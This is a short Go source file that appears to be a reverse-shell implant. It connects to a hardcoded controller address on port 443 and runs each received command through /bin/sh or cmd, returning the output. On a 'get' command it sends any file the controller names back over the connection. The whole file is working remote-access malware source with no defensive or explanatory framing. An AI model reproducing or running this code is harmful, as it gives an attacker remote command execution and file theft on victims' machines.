package main

import (
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
)

//BUFFSIZE is the buffer for communication
const BUFFSIZE = 512

//MANAGERIP connection string to the maskmanager
const MANAGERIP = "192.168.1.66:443"

func main() {

	conn, err := net.Dial("tcp", MANAGERIP)
	if err != nil {
		fmt.Println(err)
	}

	getshell(conn)

}

func getshell(conn net.Conn) {
	var cmdbuff []byte
	var command string
	cmdbuff = make([]byte, BUFFSIZE)
	var osshell string
	for {
		recvdbytes, _ := conn.Read(cmdbuff[0:])
		command = string(cmdbuff[0:recvdbytes])
		if strings.Index(command, "bye") == 0 {
			conn.Write([]byte("Good Bye !"))
			conn.Close()
			os.Exit(0)
		} else if strings.Index(command, "get") == 0 {
			fname := strings.Split(command, " ")[1]
			fmt.Println(fname)
			go sendFile(conn, fname)

		} else {
			j := 0
			osshellargs := []string{"/C", command}

			if runtime.GOOS == "linux" {
				osshell = "/bin/sh"
				osshellargs = []string{"-c", command}

			} else {
				osshell = "cmd"
			}
			execcmd := exec.Command(osshell, osshellargs...)

			cmdout, _ := execcmd.Output()
			if len(cmdout) <= 512 {
				conn.Write([]byte(cmdout))
			} else {
				i := BUFFSIZE
				for {
					if i > len(cmdout) {
						conn.Write(cmdout[j:len(cmdout)])
						break
					} else {
						conn.Write(cmdout[j:i])
						j = i
					}
					i = i + BUFFSIZE
				}

			}

			cmdout = cmdout[:0]
		}

	}
}

func sendFile(revConn net.Conn, fname string) {

	file, _ := os.Open(strings.TrimSpace(fname))
	fileInfo, err := file.Stat()
	if err != nil {
		fmt.Println(err)
		return
	}
	fileSize := padString(strconv.FormatInt(fileInfo.Size(), 10), 10)
	fileName := padString(fileInfo.Name(), 64)
	//Sending filename and filesize
	revConn.Write([]byte(fileSize))
	revConn.Write([]byte(fileName))
	sendBuffer := make([]byte, BUFFSIZE)
	//sending file contents
	for {
		_, err = file.Read(sendBuffer)
		if err == io.EOF {
			break
		}
		revConn.Write(sendBuffer)
	}
	//Completed file sending
	return
}

func padString(retunString string, toLength int) string {
	for {
		lengtString := len(retunString)
		if lengtString < toLength {
			retunString = retunString + ":"
			continue
		}
		break
	}
	return retunString
}
